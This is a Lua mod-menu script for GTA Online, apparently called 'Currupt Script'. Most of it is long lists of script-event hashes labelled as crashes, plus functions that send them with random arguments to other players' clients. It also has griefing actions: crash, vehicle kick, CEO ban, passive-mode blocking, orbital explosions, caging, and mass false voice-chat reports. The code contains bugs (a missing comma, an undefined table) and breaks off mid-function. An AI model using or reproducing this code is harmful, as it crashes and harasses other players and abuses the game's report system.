function notification(message, color)
	HUD.THEFEED_SET_BACKGROUND_COLOR_FOR_NEXT_POST(color)
	local picture
	if not filesystem.exists(resource_dir) then
		picture = "CHAR_SOCIAL_CLUB"
	else
		picture = "bruhzowski"
	end
	GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 1)
	while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
		util.yield()
	end
	util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)
	if color == colors.red or color == colors.red then
		subtitle = "~u~Notification"
	elseif color == colors.black then
		subtitle = "~c~Notification"
	else
		subtitle = "~u~Notification"
	end
	HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, "Mike", true, 4, "Currupt Script", subtitle)

	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
	util.log(message)
end

function arg11(pid)
    return (1630317 + (1 + (pid * 595) + 506))
end

function v3(x, y, z)
	if x == nil then x = 0 end
	if y == nil then y = 0 end
	if z == nil then z = 0 end
end

function draw_box(x, y, width, height, opacity)
    color = {}
    color["r"] = 0.07
    color["g"] = 0.07
    color["b"] = 0.07
    color["a"] = opacity - 0.02
    directx.draw_rect(x, y - 0.0015, width, height + 0.0015, color)
end

function RequestControlOfEnt(entity)
	local tick = 0
	local tries = 0
	NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick <= 1000 do
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
		tries = tries + 1
		if tries == 50 then 
			util.yield()
			tries = 0
		end
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end

function get_control_request(ent) -- #testing -- new get control request, yield first then request, then return. previously requested then yielded then returned and didnt work?
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
		local tick = 0
		while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
			tick = tick + 1
			util.yield()
			NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
		end
	end
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
		util.toast("No Control of "..ent)
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
end

function tp_vehicle_to(veh,x,y,z) -- #unfinished -- will this ever be finished or is this just a pointless alias for a native? i dont know.
	ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh,x,y,z,0,0,0)
end


function do_fade_in(pid) 
    CAM.DO_SCREEN_FADE_OUT(500)
    util.yield(500)
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " on")
    orbital_cannon_effects(true)
    util.yield(1000)
    CAM.DO_SCREEN_FADE_IN(1000)
    waiting = false
end
function do_fade_out(pid)
    util.yield(2500)
    CAM.DO_SCREEN_FADE_OUT(1000)
    util.yield(1000)
    orbital_cannon_effects(false)
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off;nightvision off")
    util.yield(1000)
    CAM.DO_SCREEN_FADE_IN(1000)
    waiting = false
end
function orbital_cannon_effects(on)
    if on then
        menu.trigger_commands("becomeorbitalcannon on;nightvision on;fov 130")
    else 
        menu.trigger_commands("becomeorbitalcannon off;fov 0;nightvision off")
    end
end
function orbital(pid) 
    for i = 0, 30 do 
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for j = -2, 2 do 
            for k = -2, 2 do 
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x + j, pos.y + j, pos.z + (30 - i), 29, 999999.99, true, false, 8)
            end
        end
        util.yield(20)
    end
end

cages = {}  -- 1114264700 <- vending machine cage
function cage_player(pos)
	local object_hash = util.joaat("prop_gold_cont_01b")
	pos.z = pos.z-0.9
	
	STREAMING.REQUEST_MODEL(object_hash)
	while not STREAMING.HAS_MODEL_LOADED(object_hash) do
		util.yield()
	end
	local object1 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object1																			

	local object2 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object2
	
	if object1 == 0 or object2 ==0 then --if 'CREATE_OBJECT' fails to create one of those 
		notification("Something Went Wrong Creating Cages", colors.red)
	end
	ENTITY.FREEZE_ENTITY_POSITION(object1, true)
	ENTITY.FREEZE_ENTITY_POSITION(object2, true)
	local rot  = ENTITY.GET_ENTITY_ROTATION(object2)
	rot.x = -180
	rot.y = -180
	ENTITY.SET_ENTITY_ROTATION(object2, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(object_hash)
end


function for_table_do(table,with_access,func) -- <3 HoppaC4
	for i,ent in ipairs(table) do
		if with_access then
			if not RequestControlOfEnt(ent) then goto skip end
		end
		func(ent)
		::skip::
	end
end


function get_player_veh(pid,with_access)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)	
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
		if not with_access then
			return vehicle
		end
		if RequestControlOfEnt(vehicle) then
			return vehicle
		end
	end
	return 0
end

function tp_veh_to(pid,x,y,z)
	local tries = 0
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = get_player_veh(pid,false)	
		while tries <= 1000 do --bad coooooood >:( but idk anything better
			if RequestControlOfEnt(vehicle) then			
				ENTITY.SET_ENTITY_COORDS_NO_OFFSET(vehicle, x, y, z, 0, 0, 1);
				tries = tries + 1
			end
		end
	end
end

function marqee(text)
	local temp = text
    text = text:sub(2)
	return text .. temp:sub(1, 1)
end

function upgrade_vehicle(player) --now my funky functions are useless :'( since u can do menu.trigger_commands("upgrade") or some shit
	local vehicle = get_player_veh(player,true)
	if vehicle then
		DECORATOR.DECOR_SET_INT(vehicle, "MPBitset", 0)
		VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
		for i = 0 ,50 do
			VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 1, false)
		end	
		VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, 0, 0, 0)
		VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle,0, 0, 0)
		VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 22, true)
		VEHICLE._SET_VEHICLE_XENON_LIGHTS_COLOR(vehicle, 10)
		VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 18, true)
		VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 20, true)
		for i = 0 ,4 do
			if not VEHICLE._IS_VEHICLE_NEON_LIGHT_ENABLED(vehicle, i) then
				VEHICLE._SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle, i, true)
			end
		end
		VEHICLE._SET_VEHICLE_NEON_LIGHTS_COLOUR(vehicle, 255, 0, 255)
		VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "727")
	end
end

function launch_vehicle(pid)
	local vehicle = get_player_veh(pid,true)
	if vehicle then
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, 10000, true, false, true)
	end
end

function northp_vehicle(pid)
	local vehicle = get_player_veh(pid,true)
	if vehicle then
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 10000, 0, true, false, true)
	end
end

function send_script_event(first_arg, receiver, args)
	table.insert(args, 1, first_arg)
	util.trigger_script_event(1 << receiver, args)
end


--[[local kicks_fast_legacy = {
    0x493fc6bb,
    1228916411,
    1256866538,
    -1753084819,
    1119864805,
    -1813981910,
    -892744477,
    -859672259,
    -898207315
}]]
local crashes = {
	69874647,
                    924535804,
	1494472464,
	-1991317864,
	1902624891,
	127278285,
	-195247709,
	-1322571352,
	704979198,
	-1970125962,
	2112408256,
	677240627,
	-2113023004,
	-1704141512,
	962740265,
	-1386010354,
	603406648,
	-1715193475,
	1258808115,
	998716537,
	163598572,
	-1056683619,
	-393294520
}

local newcrashes = {
153488394, -- Moist Events Added :)
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-549542517
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694
}

local candycrashes = {
69874647, -- Currupt Events Added :)
924535804,
1494472464,
-1991317864,
1902624891,
127278285,
-195247709,
-1322571352,
704979198,
-1970125962,
2112408256,
677240627,
-2113023004,
-1704141512,
962740265,
-1386010354,
603406648,
-1715193475,
1258808115,
998716537,
163598572,
-1056683619,
-393294520,
153488394,
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-549542517
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694,
153488394,
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-549542517
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694
}


function Huhcrash(pid) 
	for i,v in ipairs(crashes) do
		par1 = math.random(-100000, 99999999)
		par2 = math.random(-4827432, 3231229)
		par3 = math.random(46190868, 999999999)
		par4 = math.random(-133223, 42746729)
		par5 = math.random(-999999999, 428747628)
		send_script_event(v, pid, {pid, par1, par2, par3, par4, par5})
		util.yield()
	end
end

function Curruptcrash(pid) 
	for i,v in ipairs(crash) do
		par1 = math.random(-100000, 99999999)
		par2 = math.random(-4827432, 3231229)
		par3 = math.random(46190868, 999999999)
		par4 = math.random(-133223, 42746729)
		par5 = math.random(-999999999, 428747628)
		send_script_event(v, pid, {pid, par1, par2, par3, par4, par5})
		util.yield()
	end
end


local resolves = {
	"Hahaha",
	"Bitch!",
    "Whatever Fuck This! :P"
}

--[[function KickV1(pid, repeats) -- works
	for i = 1, repeats do
		for i,v in ipairs(kicks_fast_legacy) do
			arg = math.random(461950868, 999999999)
                                                            arg = math.random(-2^61, 2^62)
			send_script_event(v, pid, {pid, arg, arg})
			util.yield()
		end
	end
end]]


drift = false
function drift(toggle)

	if drift then
		while true do
			local veh = entities.get_user_vehicle_as_handle()
			if veh then
				if PAD.IS_CONTROL_PRESSED(1, 61) then
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, true)
        					VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
        					VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
				else
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
				end
			end        
			util.yield()
		end
	end
end

selectedplayer = {}
for b = 0, 31 do
    selectedplayer[b] = false
end
excludeselected = false

--[[function list_players(list_id)
	for pid = 0, 31 do
		if players.exists(pids) then
			menu.toggle(list_id, tostring(PLAYER.GET_PLAYER_NAME(pids)), {}, "", function(on_toggle)
				if on_toggle then
					selectedplayer[pids] = true
				else
					selectedplayer[pids] = false
				end
			end)
		end
	end
end]]


cmd_id = {}
for i = 0, 31 do
	cmd_id[i] = 0
end

local checkbruhmoment = menu.get_activation_key_hash()

local chaos, gravity, speed = false, true, 100

	menu.divider(custselc, "Slap Man")

	--[[menu.action(custselc, "Orbliterate", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					do_fade_in(pids)
					util.yield(3000)
					orbital(pids)
					util.yield(1000)
					do_fade_out(pids)

				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					do_fade_in(pids)
					util.yield(3000)
					orbital(pids)
					util.yield(1000)
					do_fade_out(pids)
				end
			end
		end
	end)]]



	menu.action(custselc, "Ban Voice Chat", {}, "May lag your game when in progress", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					for i = 1, 30 do
						menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pids))
						menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pids))
						util.yield()
					end
					notification("Ban Voice Chat has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					for i = 1, 30 do
						menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pids))
						menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pids))
						util.yield()
					end
					notification("Ban Voice Chat has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)


	menu.action(custselc, "Block Pussive", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                    send_script_event(1114091621, pids, {pids, 1})
                    send_script_event(1859990871, pids, {pids, 1})
					util.yield()
					notification("Block Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                    send_script_event(1114091621, pids, {pids, 1})
                    send_script_event(1859990871, pids, {pids, 1})
					util.yield()
					notification("Block Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)
    menu.action(custselc, "Unblock Pussive", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                    send_script_event(1114091621, pids, {pids, 0})
                    send_script_event(2033772643, pids, {pids, 0})
					util.yield()
					notification("Unblock Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                    send_script_event(1114091621, pids, {pids, 0})
                    send_script_event(2033772643, pids, {pids, 0})
					util.yield()
					notification("Unblock Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)


	menu.action(custselc, "Vehicle Kick", {}, "", function()
    	notification("Ooopsy vehicle kicked " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
					menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Vehicle Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
					menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Vehicle Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)


	menu.action(custselc, "CEO Ban", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("ceoban" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("CEO Ban has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("ceoban" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("CEO Ban has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)

	menu.action(custselc, "Huh Crash", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Huh Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Huh Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)

	menu.action(custselc, "Currupt Crash", {}, "", function()
    	notification("Sending currupt crash to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Ha Currupt Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Ha Currupt Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
				end
			end
		end
	end)

	menu.action(custselc, "Pow right in the kisser", {}, "", function()
    	notification("Pow right in the kisser sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
